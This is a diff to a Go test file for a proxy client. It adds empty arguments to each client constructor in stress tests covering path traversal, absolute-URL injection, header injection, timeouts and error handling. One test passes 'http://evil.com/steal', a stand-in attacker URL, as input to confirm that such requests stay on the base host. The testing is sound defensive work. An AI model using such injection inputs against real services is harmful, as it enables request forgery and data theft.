@@ -26,7 +26,7 @@ func TestProxyGet_StressPathTraversalBlocked(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 
 	// These paths should NOT cause requests to external hosts.
 	// They should be appended to baseURL as-is (server-side path resolution).
@@ -65,7 +65,7 @@ func TestProxyGet_StressAbsoluteURLInPath(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 
 	// Pass a full URL as path — should be concatenated, not used as-is
 	_, err := c.ProxyGet("http://evil.com/steal", "attacker")
@@ -88,7 +88,7 @@ func TestProxyGet_StressUserIDHeaderInjection(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 
 	// Go's http.NewRequest will reject headers with newlines, but verify
 	maliciousIDs := []string{
@@ -119,7 +119,7 @@ func TestProxyGet_StressEmptyUserID(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 	_, err := c.ProxyGet("/api/test", "")
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
@@ -144,7 +144,7 @@ func TestProxyGet_StressLargeResponseBounded(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 	body, err := c.ProxyGet("/api/large", "user1")
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
@@ -166,7 +166,7 @@ func TestProxyGet_StressSlowServerTimeout(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 	start := time.Now()
 	_, err := c.ProxyGet("/api/slow", "user1")
 	elapsed := time.Since(start)
@@ -191,7 +191,7 @@ func TestProxyGet_StressVariousErrorCodes(t *testing.T) {
 			w.Write([]byte(`{"error":"test"}`))
 		}))
 
-		c := NewVireClient(srv.URL)
+		c := NewVireClient(srv.URL, "", "")
 		_, err := c.ProxyGet("/api/test", "user1")
 		if err == nil {
 			t.Errorf("expected error for status %d", statusCode)
@@ -214,7 +214,7 @@ func TestProxyGet_StressConcurrentRequests(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 
 	var wg sync.WaitGroup
 	for i := 0; i < 50; i++ {
@@ -247,7 +247,7 @@ func TestProxyGet_StressMalformedResponseBody(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 	body, err := c.ProxyGet("/api/test", "user1")
 	if err != nil {
 		t.Fatalf("ProxyGet should return body for 2xx regardless of content: %v", err)
@@ -260,7 +260,7 @@ func TestProxyGet_StressMalformedResponseBody(t *testing.T) {
 // --- Network error ---
 
 func TestProxyGet_StressUnreachableServer(t *testing.T) {
-	c := NewVireClient("http://127.0.0.1:1") // Port 1 — unlikely to be listening
+	c := NewVireClient("http://127.0.0.1:1", "", "") // Port 1 — unlikely to be listening
 	_, err := c.ProxyGet("/api/test", "user1")
 	if err == nil {
 		t.Error("expected error for unreachable server")
@@ -276,7 +276,7 @@ func TestProxyGet_StressEmptySuccessBody(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	c := NewVireClient(srv.URL)
+	c := NewVireClient(srv.URL, "", "")
 	body, err := c.ProxyGet("/api/empty", "user1")
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
